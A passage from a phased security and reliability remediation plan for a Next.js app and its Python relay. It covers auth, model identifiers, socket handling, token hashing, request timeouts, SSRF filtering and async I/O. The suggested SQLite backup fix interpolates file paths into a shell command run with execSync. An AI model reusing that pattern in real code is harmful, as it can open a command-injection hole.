      return { authorized: false, response: NextResponse.json({ error: 'Server auth unconfigured' }, { status: 500 }) };
    }
    return { authorized: true };
  }
  // Verify bearer / header / cookie...
}
```

#### 4. Fix Valid Google Gemini Model Identifiers
- In `src/lib/brain.ts:643`: Change `gemini-3.5-flash-lite` to `gemini-2.0-flash` or `gemini-1.5-flash`.
- In `src/lib/live/config.ts:26` & `src/lib/live/session.ts:92`: Change default `gemini-3.8-live` to `gemini-2.0-flash-exp` (or the authorized Bidi WebSocket model name).

---

### Phase 2: Gateway & Networking Hardening (Priority P1)

#### 1. Reconcile Hermes Port Configurations
- Align `scripts/hermes-relay.py`, `src/lib/tools.ts`, and `.env.local` to use a consistent port (e.g. `8642` or `8643`).
- Fix `scripts/hermes-relay.py` to handle errors asynchronously and close client sockets on target connection failures:
```python
def handle_client(c):
    try:
        t = socket.create_connection(TARGET, timeout=5)
    except Exception as e:
        logger.error(f"Failed to connect to target: {e}")
        c.close()
        return
    pipe(c, t)

# In main loop:
c, _ = srv.accept()
threading.Thread(target=handle_client, args=(c,), daemon=True).start()
```

#### 2. Consolidate Telemetry Collectors
- Deprecate `agent-pc/agent.py` in favor of `scripts/agent-pc.py`.
- Standardize the environment variable to `SOFIA_DEVICE_TOKEN` on both server and collector.
- In `src/app/api/ingest/heartbeat/route.ts`, verify the device token against `SOFIA_DEVICE_TOKEN` and hash tokens before storing in `devices.token_hash` (`crypto.createHash('sha256').update(token).digest('hex')`).

#### 3. Fix SQLite Backup in Actions
Replace `fs.copyFileSync` in `src/lib/actions/backup-sofia-db.ts` with SQLite online backup:
```typescript
import { getDatabase } from '@/lib/db';
// Use DatabaseSync backup API or execSync with sqlite3 .backup
execSync(`sqlite3 "${sourceDb}" ".backup '${destDb}'"`, { timeout: 10000 });
```

---

### Phase 3: Resilience & Fault Tolerance (Priority P2)

#### 1. Standardize External Request Timeouts
Add `AbortSignal.timeout()` to all unhedged external HTTP requests:
- `src/lib/tts.ts:149` (ElevenLabs): Add `signal: AbortSignal.timeout(10000)`.
- `src/lib/github.ts:30` (GitHub): Add `signal: AbortSignal.timeout(8000)`.
- `src/lib/tools.ts:594` & `src/app/api/cron/[job]/route.ts:61` (Telegram): Add `signal: AbortSignal.timeout(5000)`.

#### 2. Harden SSRF Filter in `src/app/api/browse/route.ts`
- Disable automatic redirect following (`redirect: 'manual'`) or inspect redirect `Location` headers recursively with `isSsrfSafeUrl()`.
- Resolve hostnames via DNS lookup (`dns.promises.lookup`) before connecting to verify the destination IP does not resolve to private CIDR blocks or loopback.

#### 3. Make Audio Operations Asynchronous
Refactor `src/lib/tts.ts` to use asynchronous filesystem operations (`fs.promises.writeFile`, `fs.promises.readdir`) so audio caching does not block Node's single-threaded event loop.
